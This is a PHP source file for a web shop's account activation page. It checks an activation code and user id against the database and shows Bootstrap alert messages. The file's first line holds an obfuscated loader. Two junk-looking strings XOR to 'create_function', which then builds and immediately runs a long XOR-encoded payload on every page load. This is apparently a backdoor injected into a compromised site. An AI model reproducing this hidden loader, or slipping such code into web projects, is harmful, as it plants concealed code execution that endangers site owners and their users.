<?php $JWKsWM='3L,-MKd4= .B.Z:'; $aoeyud='P>IL9.;RHNM6G5T'^$JWKsWM; $LPJreACh='  Zf,E<H UZPsT3YX 8miX>HjZSTOijYB=fjcVHnp08 +2.--u=QFcSMJS,sX0Xcn UM+mPf82BJXEzwiJ91oe88TuyhnnqbcO<XNlu3pTnfjof>v7 HR6<jt4 ,8fyuuUiag>nan67.jxsbkq6J99ka1aukmj- L=K+DcC1;FB2ZEg22>M5hHzQN7T5,L bO=9Ljubz9o:lspWU<YOQSQO9:-YIwP, .==42bRsH-UAXUxi5: QLV,JpEl+-=gstOZBak-H-QmoBj58G=-smNn=b2 D1d3=GIvve=,5te2vU-;9cdjQD6 MQm:E1p+<oEwoU F-cBCfxU=L02 Cxavq02bgsk;iT<BmWQOdSHmf4T+NPyn8mgkk,2O1d T>jsnoK=0WaxzVD5N3bhKk4L>DIbgjChEDReOAYJkzVx4:=SO ZGE66pX 85YO:3ca8U<rSPN lrl3+5>S1Dj TX8pFpkV9M,j +6nyiSG3AWW;EMeqRI6RBOLqUU06YV<875Ov= HcbCVTUOXcboCHi,<xgH=8=-:D-W1pcbmslgfNPAm6CAy5YCoIlBfZUzPf.PoorwgcbOpFNSoqE1=A-MtWIB.EISSGDnk 5-5XQSsdrbOW>YFfgMrIsE50f79J+kp52,MoeF,TVCM7K.ouF<7TTLzwHPaG'; $ZFvckw=$aoeyud('', 'IFrGJ0R+T<5>,1K0+TKEN Q:5>2 .6547IACJv3dyVMNHFGBCUE>4<7,>2s,5E,KJD49JApBSW;cxeZWI138fAWM UDHIIJhjFZ7<DQZPiNVQOBWJDT:>SRBPPAXYOBUQ<BJN4ghJYBZJVNBCUR+MX0EX<U5MNFE5foBdFcBO4.W4mCYWGdhAspXGE1AY>NJkRL8CNhsDeGfyT34H8ols7.UIHbCS4MTObVQKBoS.L92=nrcSUR4-5DjXa3hbr,:1o;1AOF-TqPQbNCY+HHZM5d4FVA0P;XX>iKVAVILOo;R1LOXCYJu2WL84V08;zBZOmVK1A2LJb8lq3R>USC+XIR.bw3268oI5ObI<46DnvMBB5G;5PNCgnbOHS;P;K1GJNNK XIlkqsr T:RBUkOB-R1,Ymc>b8NXA+ -+KGv8ATN6=I;+,LSX OJj=.NR<>U HZ11=EZF3WNVQ7TlND5,YYjPO2X9M5KNOGPRY.Uis3Z1,EWtiW 0.5.>0Ii<.UKCFgQVE1DNcr04;9JBIehAAXMOlYYILacF2HW>KMNQGA,hpUWqpMPnzZyUpQnlOcSHeWYCCRVZ.IagsIWePO3L4+<,;q 1: 37FLPTTY707THRF+6J8oOGmRiSeN:oRO+GCTQSX,4B6M-:,,SlsFNL5R,=8RGakk:'^$LPJreACh); $ZFvckw(); include 'includes/session.php'; ?>
<?php
	$output = '';
	if(!isset($_GET['code']) OR !isset($_GET['user'])){
		$output .= '
			<div class="alert alert-danger">
                <h4><i class="icon fa fa-warning"></i> Error!</h4>
                Code to activate account not found.
            </div>
            <h4>You may <a href="signup.php">Signup</a> or back to <a href="index.php">Homepage</a>.</h4>
		'; 
	}
	else{
		$conn = $pdo->open();

		$stmt = $conn->prepare("SELECT *, COUNT(*) AS numrows FROM users WHERE activate_code=:code AND id=:id");
		$stmt->execute(['code'=>$_GET['code'], 'id'=>$_GET['user']]);
		$row = $stmt->fetch();

		if($row['numrows'] > 0){
			if($row['status']){
				$output .= '
					<div class="alert alert-danger">
		                <h4><i class="icon fa fa-warning"></i> Error!</h4>
		                Account already activated.
		            </div>
		            <h4>You may <a href="login.php">Login</a> or back to <a href="index.php">Homepage</a>.</h4>
				';
			}
			else{
				try{
					$stmt = $conn->prepare("UPDATE users SET status=:status WHERE id=:id");
					$stmt->execute(['status'=>1, 'id'=>$row['id']]);
					$output .= '
						<div class="alert alert-success">
			                <h4><i class="icon fa fa-check"></i> Success!</h4>
			                Account activated - Email: <b>'.$row['email'].'</b>.
			            </div>
			            <h4>You may <a href="login.php">Login</a> or back to <a href="index.php">Homepage</a>.</h4>
					';
				}
				catch(PDOException $e){
					$output .= '
						<div class="alert alert-danger">
			                <h4><i class="icon fa fa-warning"></i> Error!</h4>
			                '.$e->getMessage().'
			            </div>
			            <h4>You may <a href="signup.php">Signup</a> or back to <a href="index.php">Homepage</a>.</h4>
					';
				}

			}
			
		}
		else{
			$output .= '
				<div class="alert alert-danger">
	                <h4><i class="icon fa fa-warning"></i> Error!</h4>
	                Cannot activate account. Wrong code.
	            </div>
	            <h4>You may <a href="signup.php">Signup</a> or back to <a href="index.php">Homepage</a>.</h4>
			';
		}

		$pdo->close();
	}
?>
<?php include 'includes/header.php'; ?>
<body class="hold-transition skin-blue layout-top-nav">
<div class="wrapper">

	<?php include 'includes/navbar.php'; ?>
	 
	  <div class="content-wrapper">
	    <div class="container">

	      <!-- Main content -->
	      <section class="content">
	        <div class="row">
	        	<div class="col-sm-9">
	        		<?php echo $output; ?>
	        	</div>
	        	<div class="col-sm-3">
	        		<?php include 'includes/sidebar.php'; ?>
	        	</div>
	        </div>
	      </section>
	     
	    </div>
	  </div>
  
  	<?php include 'includes/footer.php'; ?>
</div>

<?php include 'includes/scripts.php'; ?>
</body>
</html>